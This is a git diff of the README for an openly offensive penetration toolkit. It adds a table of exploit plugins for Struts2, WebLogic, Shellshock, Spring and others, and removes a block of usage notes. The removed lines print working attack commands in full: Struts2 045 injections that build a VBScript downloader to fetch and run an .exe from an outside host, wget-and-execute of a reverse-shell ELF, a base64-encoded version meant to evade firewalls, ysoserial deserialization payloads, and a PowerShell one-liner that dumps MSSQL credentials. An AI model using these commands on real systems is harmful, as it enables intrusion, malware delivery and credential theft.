@@ -1,4 +1,3 @@
-# penetration tools
 ##### Twitter: [@Hktalent3135773](https://twitter.com/Hktalent3135773)
 [![Tweet](https://img.shields.io/twitter/url/http/Hktalent3135773.svg?style=social)](https://twitter.com/intent/tweet?original_referer=https%3A%2F%2Fdeveloper.twitter.com%2Fen%2Fdocs%2Ftwitter-for-websites%2Ftweet-button%2Foverview&ref_src=twsrc%5Etfw&text=myhktools%20-%20Automated%20Pentest%20Recon%20Scanner%20%40Hktalent3135773&tw_p=tweetbutton&url=https%3A%2F%2Fgithub.com%2Fhktalent%2Fmyhktools)
 [![Follow on Twitter](https://img.shields.io/twitter/follow/Hktalent3135773.svg?style=social&label=Follow)](https://twitter.com/intent/follow?screen_name=Hktalent3135773)
@@ -18,6 +17,7 @@
 ![python](https://img.shields.io/badge/python2-red.svg)
 ![license](https://img.shields.io/github/license/mashape/apistatus.svg)
 
+# penetration tools
 <!--
 
 |<img src="https://github.com/hktalent/myhktools/blob/master/bin/hk1.jpg?raw=true" width=400>|<img src="https://github.com/hktalent/myhktools/blob/master/bin/hk2.jpg?raw=true" width=400>|
@@ -36,20 +36,6 @@
 | bash | base64、tr、nc,auto generate payload |
 | python | auto generate and send payload |
 
-## how install
-```
-# mac os
-brew install node
-# linux
-apt install nodejs node
-yum install nodejs node
-
-mkdir ~/safe && cd ~/safe
-git clone https://github.com/hktalent/myhktools.git
-cd myhktools
-sh ./install.sh
-node checkUrl.js -h
-```
 ## New features
 ```
 # how use exploit CVE-2018-15982
@@ -84,6 +70,77 @@ cat /mysvn/xx.sh|grep -Eo "'([^']+)'"|xargs -I % bash -c 'curl --connect-timeout
 
 
 ```
+## plugins
+
+|name|tags|dependencies|des|
+| --- | ---  | ---  | --- |
+|/bash/CVE-2014-6271.js|shellshock,web,CVE-2014-6271,rci|java,ysoserial,base64,tr|Shellshock Remote Command Injection (CVE-2014-6271)|
+|/GlassFish/4.1.0.js|glassfish,web||glassfish 4.1.0 漏洞检测|
+|/elasticsearch/CVE-2015-1427.js|elasticsearch,web,CVE-2015-1427|java,ysoserial,base64,tr|elasticsearch,web,CVE-2015-1427,RCE,ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞（CVE-2015-1427）测试环境|
+|/elasticsearch/CVE-2014-3120.js|elasticsearch,web,CVE-2014-3120|java,ysoserial,base64,tr|elasticsearch,web,CVE-2014-3120,RCE|
+|/elasticsearch/CVE-2015-3337.js|CVE-2015-3337,||ElasticSearch 目录穿越漏洞（CVE-2015-3337）测试环境|
+|/flask/ssti.js|ssti,flask,parms||Flask（Jinja2） 服务端模板注入漏洞|
+|/jackson/drupal_CVE-2018-7600.js|CVE-2018-7600,web,drupal|java,ysoserial,base64,tr|drupal,漏洞检测|
+|/jackson/CVE-2017-7525.js|jackson,web,CVE-2017-7525,CVE-2017-17485|java,ysoserial,base64,tr|CVE-2017-7525,漏洞检测,JDK7u21,CVE-2017-17485|
+|/jackson/fastjson.js|fastjson,web,|java,ysoserial,base64,tr|fastjson,漏洞检测|
+|/http/attackhost.js|http,host,spoof,web||spoof host,漏洞检测|
+|/goahead/CVE-2017-17562.js|CVE-2017-17562,goahead,web|gcc,c lib,rm(/tmp/xx)|GoAhead 远程命令执行漏洞（CVE-2017-17562） 漏洞检测|
+|/java/CVE-2017-5645_log4j.js|log4j,web,CVE-2017-5645|java,ysoserial,base64,nc|CVE-2017-5645,漏洞检测,log4j|
+|/java/CVE-2018-1297_jmeter.js|jmeter,CVE-2018-1297|java,ysoserial|jmeter,CVE-2018-1297,漏洞检测|
+|/jboss/CVE-2017-12149.js|jboss,CVE-2017-12149|java,ysoserial|jboss,CVE-2018-1297,漏洞检测|
+|/jdk/7u25.js|jre7,jdk7,jre1.7,jdk1.7,1.7,web,CVE-2013-0431,0431||jre7,jdk7,jre1.7,jdk1.7,1.7,web漏洞检测,|
+|/smb/CVE-2017-7494.js|smb,win,CVE-2017-7494|java,ysoserial,base64,tr|smb,win,CVE-2017-7494,漏洞检测|
+|/spring/CVE-2018-1270.js|spring,CVE-2018-1270,1270,parms,web||spring CVE-2018-1270 RCE漏洞检测,CVE-2018-1270: Remote Code Execution with spring-messaging|
+|/spring/cve-2017-4971.js|spring,cve-2017-4971,4917,parms,web|java,ysoserial,base64,tr|spring cve-2017-4971 RCE漏洞检测,CVE-2017-4971: Remote Code Execution Vulnerability In The Spring Web Flow Framework|
+|/struts/001.js|struts2,001,ww-2030,2030,parms,web||WW-2030,struts2 001漏洞检测|
+|/struts/005.js|struts2,005,ww-3470,xw-641,641,3470,web||WW-3470,XW-641,struts2 005漏洞检测|
+|/struts/007.js|struts2,007,ww-3668,3668,parms||WW-3668,struts2 007漏洞检测|
+|/struts/008.js|struts2,008,ww-3729,3729,web||WW-3729,struts2 漏洞检测|
+|/struts/012.js|struts2,012,cve-2013-1965,parms,20131965||CVE-2013-1965,struts2 012漏洞检测|
+|/struts/009.js|struts2,009||struts2 漏洞检测|
+|/struts/013.js|struts2,013,parms||struts2 013漏洞检测|
+|/struts/015.js|struts2,015||struts2 015漏洞检测|
+|/struts/016.js|struts2,016||struts2 016漏洞检测|
+|/struts/019.js|struts2,019||struts2 019漏洞检测|
+|/struts/029.js|struts2,029,parms||struts2 029漏洞检测|
+|/struts/032.js|struts2,032||struts2 032漏洞检测|
+|/struts/037.js|struts2,037,cve-2016-4438,20164438||CVE-2016-4438,struts2 037漏洞检测|
+|/struts/045.js|web,struts2,045,cve-2017-5638,20175638||CVE-2017-5638,struts2 045漏洞检测|
+|/struts/033.js|struts2,033,cve-2016-3087,20163087||CVE-2016-3087,struts2 033漏洞检测|
+|/struts/046.js|struts2,046,cve-2017-5638,20175638||CVE-2017-5638,struts2 046漏洞检测|
+|/struts/048.js|struts2,048,cve-2017-9791,20179791,parms||CVE-2017-9791,struts2 048漏洞检测|
+|/struts/053.js|struts2,053,parms||struts2 053漏洞检测|
+|/struts/052.js|struts2,052||struts2 052漏洞检测,CVE-2017-9805|
+|/struts/054.js|struts2,052||struts2 052漏洞检测|
+|/struts/CVE-2016-100031.js|web,acf,CVE-2016-100031,fileupload,CVE-2013-2186|java,|CVE-2016-100031,CVE-2013-2186,Apache Commons FileUpload 漏洞检测|
+|/struts/055.js|struts2,055,CVE-2017-7525,7525,parms|javac|struts2 055漏洞检测,|
+|/struts/057.js|web,struts2,057||CVE-2018-11776,struts2 057漏洞检测|
+|/struts/devMode.js|struts2,devMode||struts2 devMode漏洞检测|
+|/struts/ognl.js|struts2,parms,ognl||struts2 052漏洞检测|
+|/struts/pythonBc.js|struts2,python|python,struts-scan.py|struts2 python脚本漏洞检测补充|
+|/tomcat/CVE-2016-6816.js|tomcat,CVE-2016-6816||Apache Tomcat CVE-2016-6816 Security Bypass Vulnerability 漏洞检测|
+|/tomcat/CVE-2017-12616.js|tomcat,CVE-2017-12616,12616,CVE-2017-12617||tomcat,漏洞检测|
+|/weblogic/SSRF.js|ssrf,weblogic,uddi,xspa||SSRF开放状态监测,CVE-2014-4210,UDDI Explorer,CVE-2014-4241, CVE-2014-4242)|
+|/weblogic/201710271.js|weblogic,CVE-2017-10271,10271,3506|payload/[x.jsp,*.sh],msfvenom,curl|CVE-2017-10271,weblogic CVE-2017-10271,CVE-2017-3506漏洞检测|
+|/weblogic/t3.js|t3,weblogic||T3开放状态监测|
+|/xss/xss1.js|xss,parms,web||xx,漏洞检测|
+
+
+## how install
+```
+# mac os
+brew install node
+# linux
+apt install nodejs node
+yum install nodejs node
+
+mkdir ~/safe && cd ~/safe
+git clone https://github.com/hktalent/myhktools.git
+cd myhktools
+sh ./install.sh
+node checkUrl.js -h
+```
+
 ## update all node js lib
 ```
 vi ~/npm-upgrade.sh 
@@ -125,192 +182,11 @@ Usage: checkUrl [options]
     -a, --host              host attack test,设置代理后该项功能可能无法使用,default true
     -k, --keys [value]      scan html keywords, default ./urls/keywords
     -h, --help              output usage information
-```
-#### Features
-- [x] tomcat Put test
-- [x] Struts2_001
-- [ ] Struts2_005
-- [x] Struts2_007
-- [x] Struts2_008
-- [x] Struts2_009
-- [x] Struts2_012
-- [x] Struts2_013
-- [x] Struts2_015
-- [x] Struts2_016
-- [x] Struts2_019
-- [ ] Struts2_020
-- [x] Struts2_029
-- [x] Struts2_032
-- [ ] Struts2_033
-- [ ] Struts2_037
-- [ ] Struts2_DevMode
-- [x] Struts2_045
-- [x] Struts2_046
-- [x] Struts2_048
-- [x] Struts2_053
-- [ ] Struts2_052
-- [x] Struts2_055
-- [x] Struts2_057
-- [ ] elasticsearch
-- [x] 伪造host等检测
-- [x] t3
-- [x] 10271
 
-#### other help
-```
 	node checkUrl.js -u http://192.168.10.216:8082/s2-032/ --struts2 045
 
-	# 利用struts2 045漏洞，下载metasploit反弹程序并执行，以下在一行中
-	# cd myhktools/jars;python -m SimpleHTTPServer 8080
-	node checkUrl.js -u http://92.68.0.5:8080/PortalServer/customize/defaultZh/auth.jsp --struts2 045 --cmd 'del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.15:8080/Love.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'
+............
 
-	cd myhktools/jars;java -jar jfxl.jar xxx.x.xx.xx:xxx -i
-	pwd
-	put myhktools/bin/run.sh
-	/home/weblogic/Oracle/Middleware/user_projects/domains/domain/run.sh
-
-	node checkUrl.js -u http://19.6.4.19:8122/login.jsp --struts2 045 --cmd 'x=linuxRvsTcp123.elf; wget --header="User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" http://23.105.209.65/${x}; chmod +x ${x}; ./${x} &'
-
-	x=Lover1234_65.exe; wget --header="User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" http://23.105.209.65/${x};
-
-	cmd.exe /c 'del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://23.105.209.65/Lover1234_65.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'
-
-
-	java -cp ysoserial-master-v0.0.5-gb617b7b-16.jar ysoserial.exploit.RMIRegistryExploit 192.168.24.10 7777 CommonsCollections1 cmd.exe /c 'del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://23.105.209.65/Lover1234_65.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'
-
-	java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.BlazeDSAMF3 C3P0WrapperConnPool
-	gadget type specified, available are [UnicastRef, SpringPropertyPathFactory, C3P0WrapperConnPool]
-
-	IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/Powershell-Modules/master/Get-MSSQLCredentialPasswords.psm1"); Get-MSSQLCredentialPasswords
-
-	node checkUrl.js -u http://119.6.84.189:8122/login.jsp --struts2 045 --cmd 'echo "eD1saW51eFJ2c1RjcDEyMy5lbGY7IHdnZXQgLS1oZWFkZXI9IlVzZXItQWdlbnQ6TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTJfMykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU2LjAuMjkyNC44NyBTYWZhcmkvNTM3LjM2IiBodHRwOi8vMjMuMTA1LjIwOS42NS8ke3h9OyBjaG1vZCAreCAke3h9OyAuLyR7eH0gJgo="|base64 -D|sh'
-
-	绕过防火墙、执行命令，避免引号等在注入攻击时失效
-	思路：
-	对执行的命令串编码，base64，运行时解码再执行，例如：
-	echo 'eD1saW51eFJ2c1RjcDEyMy5lbGY7IHdnZXQgLS1oZWFkZXI9IlVzZXItQWdlbnQ6TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTJfMykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU2LjAuMjkyNC44NyBTYWZhcmkvNTM3LjM2IiBodHRwOi8vMjMuMTA1LjIwOS42NS8ke3h9OyBjaG1vZCAreCAke3h9OyAuLyR7eH0gJgo='|base64 -D|sh
-
-	x=linuxRvsTcp123.elf; wget --header='User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36' http://23.105.209.65/linuxRvsTcp123.elf; chmod +x linuxRvsTcp123.elf; ./${x} &
-
-	# 生成远程反弹payload
-	java -jar ./ysoserial-master-v0.0.5-gb617b7b-16.jar  C3P0 '@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.15:8080/Love.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'
-
-	java -jar ./ysoserial-master-v0.0.5-gb617b7b-16.jar  CommonsCollections1  '@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.15:8888/Love.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'
-
-
-	node checkUrl.js -u http://192.168.10.15:8080/ --struts2 045 --cmd 'tasklist -svc'
-
-	# 批量开放T3检测，txt中可以放url
-	node checkUrl.js --t3 checkT3hostsUrlsFile.txt
-	# 常见webshell和url扫描
-	node checkUrl.js -s ./urls/webshell.txt -m ./urls/ta3menu.txt -u http://192.168.10.115:8080/
-
-	# 当别人能够访问你，但是不能访问10.115的时候，进行端口转发，
-	# 这样别人访问你的9000等同于访问10.115的8080，https的时候不使用，因为数字证书会检查域名
-	node portForward.js 9000 192.168.10.115 8080
-
-	# T3协议漏洞的检测和利用
-	java -jar jfxl.jar 192.168.19.30:7001
-
-	# 指定一个网段的漏洞验证扫描
-	java -jar jfxl.jar 192.168.19.30-255:7001
-
-	# 目录、文件中文本文件字符集批量转换为utf-8
-	# 后渗透后得到很多win的数据txt文件，字符集gbk批量转换为utf8
-	node gbk2utf8.js fileOrDirName
-
-	# 多种解码
-	node decode.js base64等格式字符串
-
-	# eml 文件批量读取、转换
-	node emlToFileToos.js /Volumes/MyWork/eml /Volumes/MyWork/eml_data
-
-	# 手工XSS、渗透时需要的一些常用编码、解码
-	open strDecodeEncode.html
-
-	# 获取图片中的元数据（经纬度、创建时间）
-	node getFileMetadata.js yourJpgFile.jpg
-
-	# jndi内网无密码访问漏洞测试
-	java -jar ./JNDI_TEST/JNDITEST.jar -p 7101 -u 192.168.10.216 -j QIMS_TEST -d mysql
-
-	# weblogic中间件T3漏洞扫描
-	编辑ip.txt
-	python ./weblogic.py
-
-	# 二维码解码
-	node QrCodeDecode.js Haiios.jpg
-
-	# svn 弱密码检测 2017-01-22 M.T.X
-	node checkSvn.js http://18.12.88.10:8090/svn/ userName Pswd
-
-	# 信箱默认密码测试
-	node testPop3.js 12.171.20.20 110 mytels.txt
-
-	# http代理，有时候需要一个二级代理，来获得、修改一些数据
-	# 动态代理，每次自动随机使用代理
-	node proxy/ProxyServer.js
-	or
-	pm2 start ProxyServer.js -i max
-
-	# 更新代理 autoProxy.txt
-
-	node checkProxy.js
-	cat autoProxy.txt|sort|uniq >ok.txt
-	mv ok.txt autoProxy.txt
-	cat autoProxy.txt|wc -l
-
-	# 提取目录、文件，包含二进制文件中 ip信息
-	# 被入侵后，查看整个目录中所有ip信息，包含bin，可自行文件中的ip信息
-	node getIps.js fileOrDir
-
-	# 发送无跟踪邮件
-	sendmail.js  内容自行修改
-	邮件跟踪功能，当对方阅读后，能够从http://23.105.209.65/获取到阅读邮件的ip、user-agent等信息
-	proxychains4 -f ~/pc.conf  node sendmail.js
-
-	# 某种js压缩后的解码、压缩编码, win下运行
-	压缩.hta
-
-批量ip归属查询
-node ./myapp/lib/myMysql.js -k myLogs.txt
-
-	# 连接http隧道
-	python reGeorgSocksProxy.py -l 127.0.0.1 -p 8080 -u http://11.22.10.10:8070/ip/x.jsp
-
-node checkUrl.js -u 'http://19.16.14.19:8133/pxorg/login.jsp' --struts2 045 --cmd 'find . -name 417.jsp 2>/dev/null'
-
-node checkUrl.js -u 'http://22.15.21.18:8082/sjcj/login.jsp' -v --struts2 weblogic
-
-node checkAll.js -v --struts2 struts2
-
-#!/usr/bin/env node
-var kkk = require('./lib/core_new.js');
-var r = new kkk();
-// -v 参数才会输出
-r.on('log',function(s)
-{
-	console.log(s);
-});
-r.on('info',function(s)
-{
-	console.log(s);
-});
-r.on('error',function(s)
-{
-	// console.log(s);
-});
-// 发现安全问题才会进入这里
-r.on('vul',function(v,t,s)
-{
-	if(v.vul)console.log(v);
-});
-
-r.on('ready',function()
-{
-	console.log('准备好了....');
-	// r.runChecks();
-});
 ```
 
 # iptables, disabele ping、nmap
